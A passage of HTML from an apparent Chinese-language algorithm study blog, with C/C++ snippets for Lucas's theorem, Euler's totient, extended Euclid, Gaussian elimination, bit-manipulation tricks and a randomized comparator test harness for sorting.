class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> p = <span class="hljs-number">7</span>; <span class="hljs-comment">// 模质数为7</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100</span>;<br><br><span class="hljs-comment">// 快速幂算法，用于计算 (a^k) % p</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">qmi</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> k)</span> &#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (k) &#123;<br>        <span class="hljs-keyword">if</span> (k &amp; <span class="hljs-number">1</span>) res = (LL)res * a % p;  <span class="hljs-comment">// 如果 k 是奇数，乘以 a</span><br>        a = (LL)a * a % p;  <span class="hljs-comment">// 计算 a^2 % p</span><br>        k &gt;&gt;= <span class="hljs-number">1</span>;  <span class="hljs-comment">// k 右移一位，减少 k 的大小</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// 计算组合数 C(a, b) % p</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">C</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, j = a; i &lt;= b; i++, j--) &#123;<br>        res = (LL)res * j % p;  <span class="hljs-comment">// 乘上 a! 中的元素</span><br>        res = (LL)res * qmi(i, p - <span class="hljs-number">2</span>) % p;  <span class="hljs-comment">// 乘上 i! 的逆元，利用费马小定理计算</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// Lucas 定理，用于计算 C(a, b) % p</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">lucas</span><span class="hljs-params">(LL a, LL b)</span> &#123;<br>    <span class="hljs-keyword">if</span> (a &lt; p &amp;&amp; b &lt; p) <span class="hljs-keyword">return</span> C(a, b);  <span class="hljs-comment">// 基本情况，直接计算 C(a, b)</span><br>    <span class="hljs-keyword">return</span> (LL)C(a % p, b % p) * lucas(a / p, b / p) % p;  <span class="hljs-comment">// 递归应用 Lucas 定理</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n, m;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Enter values for n and m: &quot;</span>;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; m;<br><br>    <span class="hljs-comment">// 计算 C(n, m) % p</span><br>    <span class="hljs-type">int</span> result = lucas(n, m);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;C(&quot;</span> &lt;&lt; n &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; m &lt;&lt; <span class="hljs-string">&quot;) % &quot;</span> &lt;&lt; p &lt;&lt; <span class="hljs-string">&quot; = &quot;</span> &lt;&lt; result &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="求欧拉函数"><a href="#求欧拉函数" class="headerlink" title="求欧拉函数"></a>求欧拉函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">phi</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    <span class="hljs-type">int</span> res = x;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= x / i; i ++ )<br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>)<br>        &#123;<br>            res = res / i * (i - <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">while</span> (x % i == <span class="hljs-number">0</span>) x /= i;<br>        &#125;<br>    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">1</span>) res = res / x * (x - <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="筛法求欧拉函数"><a href="#筛法求欧拉函数" class="headerlink" title="筛法求欧拉函数"></a>筛法求欧拉函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> primes[N], cnt;     <span class="hljs-comment">// primes[]存储所有素数</span><br><span class="hljs-type">int</span> euler[N];           <span class="hljs-comment">// 存储每个数的欧拉函数</span><br><span class="hljs-type">bool</span> st[N];         <span class="hljs-comment">// st[x]存储x是否被筛掉</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_eulers</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span><br>&#123;<br>    euler[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!st[i])<br>        &#123;<br>            primes[cnt ++ ] = i;<br>            euler[i] = i - <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; primes[j] &lt;= n / i; j ++ )<br>        &#123;<br>            <span class="hljs-type">int</span> t = primes[j] * i;<br>            st[t] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (i % primes[j] == <span class="hljs-number">0</span>)<br>            &#123;<br>                euler[t] = euler[i] * primes[j];<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            euler[t] = euler[i] * (primes[j] - <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 求x, y，使得ax + by = gcd(a, b)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">exgcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> &amp;x, <span class="hljs-type">int</span> &amp;y)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!b)<br>    &#123;<br>        x = <span class="hljs-number">1</span>; y = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-type">int</span> d = exgcd(b, a % b, y, x);<br>    y -= (a/b) * x;<br>    <span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高斯消元"><a href="#高斯消元" class="headerlink" title="高斯消元"></a>高斯消元</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// a[N][N]是增广矩阵</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">gauss</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> c, r;<br>    <span class="hljs-keyword">for</span> (c = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>; c &lt; n; c ++ )<br>    &#123;<br>        <span class="hljs-type">int</span> t = r;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = r; i &lt; n; i ++ )   <span class="hljs-comment">// 找到绝对值最大的行</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][c]) &gt; <span class="hljs-built_in">fabs</span>(a[t][c]))<br>                t = i;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[t][c]) &lt; eps) <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = c; i &lt;= n; i ++ ) swap(a[t][i], a[r][i]);      <span class="hljs-comment">// 将绝对值最大的行换到最顶端</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n; i &gt;= c; i -- ) a[r][i] /= a[r][c];      <span class="hljs-comment">// 将当前上的首位变成1</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = r + <span class="hljs-number">1</span>; i &lt; n; i ++ )       <span class="hljs-comment">// 用当前行将下面所有的列消成0</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][c]) &gt; eps)<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = n; j &gt;= c; j -- )<br>                    a[i][j] -= a[r][j] * a[i][c];<br><br>        r ++ ;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (r &lt; n)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = r; i &lt; n; i ++ )<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][n]) &gt; eps)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>; <span class="hljs-comment">// 无解</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// 有无穷多组解</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i -- )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j ++ )<br>            a[i][n] -= a[i][j] * a[j][n];<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 有唯一解</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="第二类斯特林"><a href="#第二类斯特林" class="headerlink" title="第二类斯特林"></a>第二类斯特林</h3><h3 id="概率论与期望公式–均值期望"><a href="#概率论与期望公式–均值期望" class="headerlink" title="概率论与期望公式–均值期望"></a>概率论与期望公式–均值期望</h3><h3 id="唯一分解定理"><a href="#唯一分解定理" class="headerlink" title="唯一分解定理"></a>唯一分解定理</h3><h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><p> 一、基本位运算符</p><table><thead><tr><th>运算符</th><th>含义</th><th>示例 (<code>a = 5, b = 3</code>)</th><th>二进制</th><th>结果</th></tr></thead><tbody><tr><td><code>&amp;</code></td><td>与</td><td><code>a &amp; b</code></td><td><code>0101 &amp; 0011</code></td><td><code>0001</code> → 1</td></tr><tr><td>&#96;</td><td>&#96;</td><td>或</td><td>&#96;a</td><td>b&#96;</td></tr><tr><td><code>^</code></td><td>异或</td><td><code>a ^ b</code></td><td><code>0101 ^ 0011</code></td><td><code>0110</code> → 6</td></tr><tr><td><code>~</code></td><td>取反（按位非）</td><td><code>~a</code></td><td><code>~0101</code></td><td><code>1010</code> → -6（补码表示）</td></tr><tr><td><code>&lt;&lt;</code></td><td>左移</td><td><code>a &lt;&lt; 1</code></td><td><code>0101 &lt;&lt; 1</code></td><td><code>1010</code> → 10</td></tr><tr><td><code>&gt;&gt;</code></td><td>右移</td><td><code>a &gt;&gt; 1</code></td><td><code>0101 &gt;&gt; 1</code></td><td><code>0010</code> → 2</td></tr></tbody></table><hr><p> 二、常见技巧与应用场景</p><ol><li>判断奇偶</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (x &amp; <span class="hljs-number">1</span>) <span class="hljs-comment">// 奇数</span><br><span class="hljs-keyword">if</span> (!(x &amp; <span class="hljs-number">1</span>)) <span class="hljs-comment">// 偶数</span><br></code></pre></td></tr></table></figure><ol start="2"><li>交换两个数（不使用中间变量）</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">a = a ^ b;<br>b = a ^ b; <span class="hljs-comment">// (a ^ b) ^ b = a</span><br>a = a ^ b; <span class="hljs-comment">// (a ^ b) ^ a = b</span><br></code></pre></td></tr></table></figure><ol start="3"><li>提取最低位的 1</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> lowbit = x &amp; (-x); <span class="hljs-comment">// 非常常用！快速提取最低位的1</span><br></code></pre></td></tr></table></figure><p>比如 <code>x = 12</code> (1100)，最低位1在第3位，<code>x &amp; -x = 0100</code> → 4</p><p>这个技巧是 <strong>树状数组、子集枚举</strong> 的核心。</p><ol start="4"><li>位计数（统计有几个1）</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C++写法</span><br><span class="hljs-type">int</span> count = __builtin_popcount(x); <span class="hljs-comment">// GCC内建函数</span><br></code></pre></td></tr></table></figure><p>手动写：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (x) &#123;<br>    x &amp;= (x - <span class="hljs-number">1</span>); <span class="hljs-comment">// 每次清除最低位的1</span><br>    count++;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p> 三、常见位运算题型</p><p>枚举子集</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">cpp复制编辑<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> subset = mask; subset; subset = (subset - <span class="hljs-number">1</span>) &amp; mask) &#123;<br>    <span class="hljs-comment">// 遍历 mask 的所有非空子集</span><br>&#125;<br></code></pre></td></tr></table></figure><p>判断第 i 位是否为1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (x &amp; (<span class="hljs-number">1</span> &lt;&lt; i)) <span class="hljs-comment">// 第 i 位是1</span><br></code></pre></td></tr></table></figure><p>设置&#x2F;清除&#x2F;翻转第 i 位</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">x |= (<span class="hljs-number">1</span> &lt;&lt; i);   <span class="hljs-comment">// 设置第 i 位为1</span><br>x &amp;= ~(<span class="hljs-number">1</span> &lt;&lt; i);  <span class="hljs-comment">// 清除第 i 位为0</span><br>x ^= (<span class="hljs-number">1</span> &lt;&lt; i);   <span class="hljs-comment">// 翻转第 i 位</span><br></code></pre></td></tr></table></figure><hr><p>四、综合例题</p><p>例题1：统计1的个数（Hamming Weight）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">hammingWeight</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (n) &#123;<br>        n &amp;= (n - <span class="hljs-number">1</span>);<br>        count++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><p>例题2：两个整数的汉明距离</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">hammingDistance</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> __builtin_popcount(x ^ y);<br>&#125;<br></code></pre></td></tr></table></figure><p>例题3：判断是否是2的幂</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPowerOfTwo</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> n &gt; <span class="hljs-number">0</span> &amp;&amp; (n &amp; (n - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="对数器"><a href="#对数器" class="headerlink" title="对数器"></a>对数器</h1><p>随机数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">rand() % (maxValue + <span class="hljs-number">1</span>)  <span class="hljs-comment">//生成一个 [0, maxValue] 之间的随机数</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 优化算法（待验证）</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">optimizedAlgorithm</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-comment">// 替换为你需要验证的算法</span><br>    <span class="hljs-comment">// 例如，选择排序、快速排序、归并排序等</span><br>&#125;<br><br><span class="hljs-comment">// 暴力算法（用作对比）</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bruteForceAlgorithm</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-comment">// 使用内置的排序算法作为暴力算法（如 std::sort）</span><br>    sort(arr.begin(), arr.end());<br>&#125;<br><br><span class="hljs-comment">// 生成随机数组</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">generateRandomArray</span><span class="hljs-params">(<span class="hljs-type">int</span> maxSize, <span class="hljs-type">int</span> maxValue)</span> &#123;<br>    <span class="hljs-type">int</span> size = rand() % (maxSize + <span class="hljs-number">1</span>);  <span class="hljs-comment">// 数组大小在 [0, maxSize] 之间</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(size)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>        arr[i] = rand() % (<span class="hljs-number">2</span> * maxValue + <span class="hljs-number">1</span>) - maxValue;  <span class="hljs-comment">// 数值范围 [-maxValue, maxValue]</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-comment">// 复制数组</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">copyArray</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">return</span> arr;  <span class="hljs-comment">// 直接返回副本</span><br>&#125;<br><br><span class="hljs-comment">// 比较两个数组是否相等</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isEqual</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr1, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr1.size() != arr2.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; arr1.size(); i++) &#123;<br>        <span class="hljs-keyword">if</span> (arr1[i] != arr2[i]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// 打印数组</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printArray</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    srand(time(<span class="hljs-number">0</span>));  <span class="hljs-comment">// 设置随机数种子</span><br><br>    <span class="hljs-type">int</span> testTime = <span class="hljs-number">500000</span>;  <span class="hljs-comment">// 测试次数</span><br>    <span class="hljs-type">int</span> maxSize = <span class="hljs-number">100</span>;      <span class="hljs-comment">// 数组最大长度</span><br>    <span class="hljs-type">int</span> maxValue = <span class="hljs-number">100</span>;     <span class="hljs-comment">// 数值范围</span><br>    <span class="hljs-type">bool</span> succeed = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// 多次测试</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr1 = generateRandomArray(maxSize, maxValue);<br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr2 = copyArray(arr1);<br><br>        <span class="hljs-comment">// 使用优化算法排序 arr1</span><br>        optimizedAlgorithm(arr1);<br>        <span class="hljs-comment">// 使用暴力算法排序 arr2</span><br>        bruteForceAlgorithm(arr2);<br><br>        <span class="hljs-comment">// 如果排序结果不一致，输出错误信息</span><br>        <span class="hljs-keyword">if</span> (!isEqual(arr1, arr2)) &#123;<br>            succeed = <span class="hljs-literal">false</span>;<br>            printArray(arr1);<br>            printArray(arr2);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (succeed) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Nice!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Fucking fucked!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 测试单个排序结果</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = generateRandomArray(maxSize, maxValue);<br>    printArray(arr);<br>    optimizedAlgorithm(arr);<br>    printArray(arr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;返回[0,1)的一个小数</p><p>&#x2F;&#x2F;任意的x,×属于[0,1)，[0，×)范围上的数出现概率由原来的×调整成x平方</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">public <span class="hljs-type">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">xToXPower2</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> Math.max(Math.random(), Math.random());<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;三次方</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">public <span class="hljs-type">static</span> <span 